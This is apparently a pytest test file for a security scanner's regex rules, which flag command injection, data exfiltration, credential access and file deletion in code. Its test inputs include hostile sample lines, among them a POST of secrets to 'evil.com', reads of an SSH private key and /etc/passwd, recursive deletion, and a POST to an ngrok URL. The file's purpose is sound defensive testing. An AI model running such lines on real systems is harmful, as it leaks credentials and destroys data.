"""
Unit Tests for src/rules.py

TDD Approach:
1. Test that patterns compile correctly
2. Test pattern matching behavior
3. Test configuration values
"""

import re
import pytest
from src import rules


# =============================================================================
# Pattern Compilation Tests
# =============================================================================

class TestPatternCompilation:
    """Tests that all regex patterns compile correctly."""
    
    @pytest.mark.unit
    def test_high_risk_patterns_compile(self):
        """Test that all HIGH_RISK_PATTERNS compile without error."""
        for category, patterns in rules.HIGH_RISK_PATTERNS.items():
            for pattern, description in patterns:
                try:
                    compiled = re.compile(pattern, re.IGNORECASE)
                    assert compiled is not None
                except re.error as e:
                    pytest.fail(f"Pattern '{pattern}' in {category} failed to compile: {e}")
    
    @pytest.mark.unit
    def test_medium_risk_patterns_compile(self):
        """Test that all MEDIUM_RISK_PATTERNS compile without error."""
        for category, patterns in rules.MEDIUM_RISK_PATTERNS.items():
            for pattern, description in patterns:
                try:
                    compiled = re.compile(pattern, re.IGNORECASE)
                    assert compiled is not None
                except re.error as e:
                    pytest.fail(f"Pattern '{pattern}' in {category} failed to compile: {e}")
    
    @pytest.mark.unit
    def test_low_risk_patterns_compile(self):
        """Test that all LOW_RISK_PATTERNS compile without error."""
        for category, patterns in rules.LOW_RISK_PATTERNS.items():
            for pattern, description in patterns:
                try:
                    compiled = re.compile(pattern, re.IGNORECASE)
                    assert compiled is not None
                except re.error as e:
                    pytest.fail(f"Pattern '{pattern}' in {category} failed to compile: {e}")
    
    @pytest.mark.unit
    def test_suspicious_patterns_compile(self):
        """Test that all SUSPICIOUS_PATTERNS compile without error."""
        for pattern, description in rules.SUSPICIOUS_PATTERNS:
            try:
                compiled = re.compile(pattern, re.IGNORECASE)
                assert compiled is not None
            except re.error as e:
                pytest.fail(f"Pattern '{pattern}' failed to compile: {e}")
    
    @pytest.mark.unit
    def test_ignore_patterns_compile(self):
        """Test that all IGNORE_PATTERNS compile without error."""
        for pattern in rules.IGNORE_PATTERNS:
            try:
                compiled = re.compile(pattern)
                assert compiled is not None
            except re.error as e:
                pytest.fail(f"Pattern '{pattern}' failed to compile: {e}")


# =============================================================================
# High Risk Pattern Matching Tests
# =============================================================================

class TestHighRiskPatternMatching:
    """Tests for HIGH_RISK_PATTERNS matching behavior."""
    
    @pytest.mark.unit
    def test_eval_pattern_matches(self):
        """Test eval() pattern matches dangerous code."""
        patterns = rules.HIGH_RISK_PATTERNS['command_injection']
        eval_pattern = next(p for p, d in patterns if 'eval' in d)
        
        assert re.search(eval_pattern[0], "eval(user_input)", re.IGNORECASE)
        assert re.search(eval_pattern[0], "eval ( user_code )", re.IGNORECASE)
    
    @pytest.mark.unit
    def test_exec_with_variable_pattern(self):
        """Test exec() with variable pattern matching."""
        code = 'exec(malicious_code)'
        patterns = rules.HIGH_RISK_PATTERNS['command_injection']
        exec_pattern = next(p for p, d in patterns if 'exec' in d and 'variable' in d)
        
        assert re.search(exec_pattern[0], code, re.IGNORECASE)
    
    @pytest.mark.unit
    def test_os_system_with_variable_pattern(self):
        """Test os.system with variable pattern matching."""
        code = 'os.system(user_command + " --force")'
        patterns = rules.HIGH_RISK_PATTERNS['command_injection']
        os_pattern = next(p for p, d in patterns if 'os.system' in d and 'variable' in d)
        
        assert re.search(os_pattern[0], code, re.IGNORECASE)
    
    @pytest.mark.unit
    def test_subprocess_shell_true_pattern(self):
        """Test subprocess shell=True pattern matching."""
        code = 'subprocess.run(cmd, shell=True)'
        patterns = rules.HIGH_RISK_PATTERNS['command_injection']
        subprocess_pattern = next(p for p, d in patterns if 'subprocess' in d)
        
        assert re.search(subprocess_pattern[0], code, re.IGNORECASE)
    
    @pytest.mark.unit
    def test_http_post_pattern(self):
        """Test HTTP POST pattern matching."""
        code = 'requests.post("http://evil.com", data=secrets)'
        patterns = rules.HIGH_RISK_PATTERNS['data_exfiltration']
        post_pattern = next(p for p, d in patterns if 'POST' in d)
        
        assert re.search(post_pattern[0], code, re.IGNORECASE)
    
    @pytest.mark.unit
    def test_ssh_key_access_pattern(self):
        """Test SSH key access pattern matching."""
        code = 'open("/home/user/.ssh/id_rsa").read()'
        patterns = rules.HIGH_RISK_PATTERNS['credential_access']
        ssh_pattern = next(p for p, d in patterns if 'SSH' in d or '.ssh' in d)
        
        assert re.search(ssh_pattern[0], code, re.IGNORECASE)
    
    @pytest.mark.unit
    def test_memory_file_access_pattern(self):
        """Test memory file access pattern matching."""
        code = 'content = open("MEMORY.md").read()'
        patterns = rules.HIGH_RISK_PATTERNS['sensitive_file_access']
        memory_pattern = next(p for p, d in patterns if 'Memory' in d or 'MEMORY' in d)
        
        assert re.search(memory_pattern[0], code, re.IGNORECASE)
    
    @pytest.mark.unit
    def test_shutil_rmtree_pattern(self):
        """Test shutil.rmtree pattern matching."""
        code = 'shutil.rmtree("/sensitive/path/")'
        patterns = rules.HIGH_RISK_PATTERNS['file_deletion']
        # Pattern is "Recursive directory deletion" - match by position
        rmtree_pattern = patterns[0]  # First pattern is shutil.rmtree
        
        assert re.search(rmtree_pattern[0], code, re.IGNORECASE)


# =============================================================================
# Medium Risk Pattern Matching Tests
# =============================================================================

class TestMediumRiskPatternMatching:
    """Tests for MEDIUM_RISK_PATTERNS matching behavior."""
    
    @pytest.mark.unit
    def test_requests_get_pattern(self):
        """Test requests.get pattern matching."""
        code = 'requests.get("https://api.example.com")'
        patterns = rules.MEDIUM_RISK_PATTERNS['network_request']
        # Match HTTP method descriptions
        request_pattern = next(p for p, d in patterns if 'HTTP' in d)
        
        assert re.search(request_pattern[0], code, re.IGNORECASE)
    
    @pytest.mark.unit
    def test_urllib_pattern(self):
        """Test urllib pattern matching."""
        code = 'urllib.request.urlopen(url)'
        patterns = rules.MEDIUM_RISK_PATTERNS['network_request']
        urllib_pattern = next(p for p, d in patterns if 'urllib' in d)
        
        assert re.search(urllib_pattern[0], code, re.IGNORECASE)
    
    @pytest.mark.unit
    def test_base64_decode_pattern(self):
        """Test base64 decode pattern matching."""
        code = 'base64.b64decode(encoded_data)'
        patterns = rules.MEDIUM_RISK_PATTERNS['obfuscation']
        base64_pattern = next(p for p, d in patterns if 'Base64' in d or 'base64' in d)
        
        assert re.search(base64_pattern[0], code, re.IGNORECASE)
    
    @pytest.mark.unit
    def test_dynamic_import_pattern(self):
        """Test __import__ pattern matching."""
        code = 'module = __import__(module_name)'
        patterns = rules.MEDIUM_RISK_PATTERNS['dynamic_import']
        # Look for Dynamic import description
        import_pattern = next(p for p, d in patterns if 'Dynamic' in d)
        
        assert re.search(import_pattern[0], code, re.IGNORECASE)
    
    @pytest.mark.unit
    def test_etc_access_pattern(self):
        """Test /etc/ access pattern matching."""
        code = 'open("/etc/passwd").read()'
        patterns = rules.MEDIUM_RISK_PATTERNS['file_access_outside_workspace']
        etc_pattern = next(p for p, d in patterns if '/etc' in d)
        
        assert re.search(etc_pattern[0], code, re.IGNORECASE)
    
    @pytest.mark.unit
    def test_environment_access_pattern(self):
        """Test os.environ pattern matching."""
        code = 'api_key = os.environ.get("API_KEY")'
        patterns = rules.MEDIUM_RISK_PATTERNS['environment_access']
        env_pattern = next(p for p, d in patterns if 'environ' in d or 'getenv' in d)
        
        assert re.search(env_pattern[0], code, re.IGNORECASE)


# =============================================================================
# Low Risk Pattern Matching Tests
# =============================================================================

class TestLowRiskPatternMatching:
    """Tests for LOW_RISK_PATTERNS matching behavior."""
    
    @pytest.mark.unit
    def test_os_system_pattern(self):
        """Test os.system pattern matching."""
        code = 'os.system("echo hello")'
        patterns = rules.LOW_RISK_PATTERNS['shell_command']
        system_pattern = next(p for p, d in patterns if 'os.system' in d)
        
        assert re.search(system_pattern[0], code, re.IGNORECASE)
    
    @pytest.mark.unit
    def test_file_open_pattern(self):
        """Test file open pattern matching."""
        code = 'open("file.txt", "r")'
        patterns = rules.LOW_RISK_PATTERNS['file_operation']
        open_pattern = next(p for p, d in patterns if 'open' in d)
        
        assert re.search(open_pattern[0], code, re.IGNORECASE)
    
    @pytest.mark.unit
    def test_json_loads_pattern(self):
        """Test json.loads pattern matching."""
        code = 'data = json.loads(response)'
        patterns = rules.LOW_RISK_PATTERNS['json_parsing']
        json_pattern = next(p for p, d in patterns if 'loads' in d or 'load' in d)
        
        assert re.search(json_pattern[0], code, re.IGNORECASE)


# =============================================================================
# Suspicious Pattern Matching Tests
# =============================================================================

class TestSuspiciousPatternMatching:
    """Tests for SUSPICIOUS_PATTERNS matching behavior."""
    
    @pytest.mark.unit
    def test_direct_ip_access_pattern(self):
        """Test direct IP access pattern matching."""
        code = 'requests.get("http://192.168.1.100/data")'
        ip_pattern = next(p for p, d in rules.SUSPICIOUS_PATTERNS if 'IP' in d)
        
        assert re.search(ip_pattern[0], code, re.IGNORECASE)
    
    @pytest.mark.unit
    def test_pastebin_url_pattern(self):
        """Test pastebin URL pattern matching."""
        code = 'fetch("https://pastebin.com/raw/ABC123")'
        pastebin_pattern = next(p for p, d in rules.SUSPICIOUS_PATTERNS if 'Pastebin' in d)
        
        assert re.search(pastebin_pattern[0], code, re.IGNORECASE)
    
    @pytest.mark.unit
    def test_ngrok_url_pattern(self):
        """Test ngrok URL pattern matching."""
        code = 'requests.post("https://abc123.ngrok.io/collect")'
        ngrok_pattern = next(p for p, d in rules.SUSPICIOUS_PATTERNS if 'Ngrok' in d)
        
        assert re.search(ngrok_pattern[0], code, re.IGNORECASE)


# =============================================================================
# Configuration Tests
# =============================================================================

class TestConfiguration:
    """Tests for configuration constants."""
    
    @pytest.mark.unit
    def test_scan_extensions_is_set(self):
        """Test that SCAN_EXTENSIONS is a non-empty set."""
        assert isinstance(rules.SCAN_EXTENSIONS, set)
        assert len(rules.SCAN_EXTENSIONS) > 0
    
    @pytest.mark.unit
    def test_scan_extensions_contains_python(self):
        """Test that .py is in SCAN_EXTENSIONS."""
        assert '.py' in rules.SCAN_EXTENSIONS
    
    @pytest.mark.unit
    def test_scan_extensions_contains_markdown(self):
        """Test that .md is in SCAN_EXTENSIONS."""
        assert '.md' in rules.SCAN_EXTENSIONS
    
    @pytest.mark.unit
    def test_scan_extensions_contains_shell(self):
        """Test that shell extensions are in SCAN_EXTENSIONS."""
        assert '.sh' in rules.SCAN_EXTENSIONS
    
    @pytest.mark.unit
    def test_ignore_patterns_is_list(self):
        """Test that IGNORE_PATTERNS is a list."""
        assert isinstance(rules.IGNORE_PATTERNS, list)
    
    @pytest.mark.unit
    def test_ignore_patterns_contains_git(self):
        """Test that .git is in IGNORE_PATTERNS."""
        git_pattern = next(p for p in rules.IGNORE_PATTERNS if 'git' in p)
        assert git_pattern is not None
    
    @pytest.mark.unit
    def test_ignore_patterns_contains_node_modules(self):
        """Test that node_modules is in IGNORE_PATTERNS."""
        node_pattern = next(p for p in rules.IGNORE_PATTERNS if 'node_modules' in p)
        assert node_pattern is not None
    
    @pytest.mark.unit
    def test_safe_services_is_list(self):
        """Test that SAFE_SERVICES is a list."""
        assert isinstance(rules.SAFE_SERVICES, list)
    
    @pytest.mark.unit
    def test_safe_services_contains_expected(self):
        """Test that SAFE_SERVICES contains expected domains."""
        assert 'api.openai.com' in rules.SAFE_SERVICES
        assert 'api.github.com' in rules.SAFE_SERVICES
        assert 'pypi.org' in rules.SAFE_SERVICES


# =============================================================================
# Edge Case Tests
# =============================================================================

class TestPatternEdgeCases:
    """Edge case tests for patterns."""
    
    @pytest.mark.unit
    def test_eval_pattern_does_not_match_comment(self):
        """Test eval pattern doesn't match comments (ideally)."""
        # This is a known limitation - patterns may match in comments
        code = '# eval(user_input) - this is just a comment'
        patterns = rules.HIGH_RISK_PATTERNS['command_injection']
        eval_pattern = next(p for p, d in patterns if 'eval' in d)
        
        # Pattern may match in comments - this documents expected behavior
        result = re.search(eval_pattern[0], code, re.IGNORECASE)
        # We accept that it might match - analyzers handle filtering
    
    @pytest.mark.unit
    def test_case_insensitive_matching(self):
        """Test that patterns are case insensitive."""
        code_upper = 'EVAL(USER_INPUT)'
        code_lower = 'eval(user_input)'
        code_mixed = 'Eval(User_Input)'
        
        patterns = rules.HIGH_RISK_PATTERNS['command_injection']
        eval_pattern = next(p for p, d in patterns if 'eval' in d)
        
        assert re.search(eval_pattern[0], code_upper, re.IGNORECASE)
        assert re.search(eval_pattern[0], code_lower, re.IGNORECASE)
        assert re.search(eval_pattern[0], code_mixed, re.IGNORECASE)
    
    @pytest.mark.unit
    def test_empty_string_no_match(self):
        """Test that patterns don't match empty strings."""
        for category, patterns in rules.HIGH_RISK_PATTERNS.items():
            for pattern, description in patterns:
                result = re.search(pattern, "", re.IGNORECASE)
                assert result is None, f"Pattern '{pattern}' matched empty string"
